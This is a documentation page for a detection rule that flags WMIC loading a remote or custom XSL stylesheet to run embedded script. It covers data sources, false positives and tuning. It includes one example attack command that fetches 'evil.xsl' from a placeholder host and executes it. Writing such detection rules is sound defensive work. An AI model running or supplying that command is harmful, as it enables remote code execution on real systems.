# WMIC loading a remote or custom XSL stylesheet

**Rule:** [`rules/windows/defense_evasion/proc_wmic_xsl_script.yml`](../../rules/windows/defense_evasion/proc_wmic_xsl_script.yml) · **ATT&CK:** T1220 XSL Script Processing · **Level:** high

## What it detects
`wmic process list /FORMAT:"https://host/evil.xsl"` downloads a stylesheet and runs the JScript or VBScript inside it ("Squiblytwo"). The rule needs wmic, a `/format:` switch, and a URL or `.xsl` file as its value.

## Data source
Sysmon event 1. Sysmon 7 (image load of `jscript.dll` / `vbscript.dll` into wmic) is a useful second signal.

## Known false positives
Reporting scripts that use a custom local stylesheet. Built-in formats (`/format:csv`, `list`, `table`) do not match.

## Tuning notes
- WMIC is deprecated and missing from new Windows 11 builds. Where it still exists, any `/format:` with a URL is close to certain malice.
- msxsl.exe does the same thing; add it if it exists in your estate.

## Test evidence
OTRF `wmic_remote_xsl_jscript` and EVTX-ATTACK-SAMPLES `exec_wmic_xsl_internet_sysmon_3_1_11`.
